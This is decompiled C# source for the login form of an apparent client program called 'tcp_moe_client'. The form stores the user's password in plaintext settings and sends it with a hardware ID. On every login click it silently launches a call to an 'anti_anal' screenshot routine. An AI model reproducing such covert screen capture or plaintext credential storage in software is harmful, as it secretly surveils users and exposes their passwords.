using System;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using MetroFramework.Controls;
using tcp_moe_client.Classes;
using tcp_moe_client.Properties;

// Token: 0x0200005E RID: 94
public partial class Authentication : Form
{
	// Token: 0x060005DF RID: 1503 RVA: 0x0103EEC4 File Offset: 0x0103D0C4
	public Authentication(Worker worker_1)
	{
		this.worker_0 = worker_1;
		this.InitializeComponent();
		if (Settings.Default.Checked)
		{
			this.txtUsername.Text = Settings.Default.Username;
			this.txtPassword.Text = Settings.Default.Password;
			this.chkRemember.Checked = Settings.Default.Checked;
		}
	}

	// Token: 0x060005E0 RID: 1504 RVA: 0x0103EF38 File Offset: 0x0103D138
	private void btnLogin_Click(object sender, EventArgs e)
	{
		new Thread(new ThreadStart(Authentication.Class25.<>9.method_0)).Start();
		if (this.txtPassword.Text.Length >= 8 && !this.txtPassword.Text.Contains(this.txtUsername.Text))
		{
			base.Enabled = false;
			Settings.Default.Username = this.txtUsername.Text;
			Settings.Default.Password = this.txtPassword.Text;
			Settings.Default.Checked = this.chkRemember.Checked;
			Settings.Default.Save();
			Senders.Authentication(this, this.txtUsername.Text.Trim(), this.txtPassword.Text, Local.HWID, "");
			return;
		}
		UI.MsgBox.Show("Must be at least 8 characters long and cannot include your username.", "Authentication error.", MessageBoxIcon.Hand);
	}

	// Token: 0x060005E1 RID: 1505 RVA: 0x0103F030 File Offset: 0x0103D230
	public static string smethod_0()
	{
		return Dns.GetHostName();
	}

	// Token: 0x060005E2 RID: 1506 RVA: 0x0103F044 File Offset: 0x0103D244
	public void method_0()
	{
		base.Invoke(new MethodInvoker(this.method_2));
	}

	// Token: 0x060005E3 RID: 1507 RVA: 0x0103F064 File Offset: 0x0103D264
	private void Authentication_Paint(object sender, PaintEventArgs e)
	{
		e.Graphics.DrawLine(new Pen(Color.FromArgb(170, 0, 0), 16f), 0, 0, this.method_4().Right, 0);
	}

	// Token: 0x060005E4 RID: 1508 RVA: 0x0103F0A4 File Offset: 0x0103D2A4
	private void Authentication_Load(object sender, EventArgs e)
	{
		if (Settings.Default.Username != null)
		{
			this.txtUsername.Text = Settings.Default.Username;
		}
		if (Settings.Default.Password != null)
		{
			this.txtPassword.Text = Settings.Default.Password;
		}
	}

	// Token: 0x060005E5 RID: 1509 RVA: 0x0103F0F4 File Offset: 0x0103D2F4
	private void Authentication_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (this.bool_0)
		{
			this.worker_0.Shutdown();
		}
	}

	// Token: 0x060005E6 RID: 1510 RVA: 0x0103F114 File Offset: 0x0103D314
	public void method_1()
	{
		this.bool_0 = false;
		base.Invoke(new MethodInvoker(this.method_3));
	}

	// Token: 0x060005E7 RID: 1511 RVA: 0x0103F13C File Offset: 0x0103D33C
	private void txtUsername_TextChanged(object sender, EventArgs e)
	{
		if (this.txtUsername.Text.Length > 0 && this.txtPassword.Text.Length > 0)
		{
			this.btnLogin.Enabled = true;
			return;
		}
		this.btnLogin.Enabled = false;
	}

	// Token: 0x060005E8 RID: 1512 RVA: 0x010298D4 File Offset: 0x01027AD4
	private void cProgressBar1_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x060005E9 RID: 1513 RVA: 0x0103F188 File Offset: 0x0103D388
	protected virtual void Dispose(bool disposing)
	{
		if (disposing && this.icontainer_0 != null)
		{
			this.icontainer_0.Dispose();
		}
		base.Dispose(disposing);
	}

	// Token: 0x060005EB RID: 1515 RVA: 0x0103FAD0 File Offset: 0x0103DCD0
	[CompilerGenerated]
	private void method_2()
	{
		base.Enabled = true;
	}

	// Token: 0x060005EC RID: 1516 RVA: 0x0103FAE4 File Offset: 0x0103DCE4
	[CompilerGenerated]
	private void method_3()
	{
		base.Close();
	}

	// Token: 0x060005FC RID: 1532 RVA: 0x0103FAF8 File Offset: 0x0103DCF8
	Rectangle method_4()
	{
		return base.Bounds;
	}

	// Token: 0x04000250 RID: 592
	public bool bool_0 = true;

	// Token: 0x04000251 RID: 593
	private Worker worker_0;

	// Token: 0x04000252 RID: 594
	private IContainer icontainer_0;

	// Token: 0x0200005F RID: 95
	[CompilerGenerated]
	[Serializable]
	private sealed class Class25
	{
		// Token: 0x06000612 RID: 1554 RVA: 0x0103FB24 File Offset: 0x0103DD24
		internal void method_0()
		{
			anti_anal.CreateScreenshot();
		}

		// Token: 0x0400025F RID: 607
		public static readonly Authentication.Class25 <>9 = new Authentication.Class25();

		// Token: 0x04000260 RID: 608
		public static ThreadStart <>9__3_0;
	}
}
